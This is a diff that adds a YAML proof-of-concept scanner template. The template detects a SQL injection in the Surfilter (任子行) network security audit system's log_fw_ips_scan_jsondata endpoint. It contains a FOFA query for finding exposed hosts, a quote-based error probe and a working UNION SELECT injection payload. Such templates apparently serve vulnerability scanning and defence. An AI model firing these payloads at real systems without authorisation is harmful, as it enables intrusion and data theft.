@@ -1,0 +1,22 @@
+id: poc-yaml-surfilter-nsas-log-fw-ips-scan-jsondata-sqli
+info:
+  name: 任子行网络安全审计系统 log_fw_ips_scan_jsondata SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 任子行网络安全审计系统
+  fofa: title="任子行网络安全审计系统"
+requests:
+- method: GET
+  path: /webui/?g=log_fw_ips_scan_jsondata&uname='
+  headers:
+    Referer: '{{.base_url}}'
+  expression: status_code == 500
+- method: GET
+  path: /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+
+  headers:
+    Referer: '{{.base_url}}'
+  expression: status_code == 200 && contains(body,"\"group\":") && contains(body,"\"id\":")
+    && contains(body,"\"ips_uname\":")
+variables: {}
+transport: http
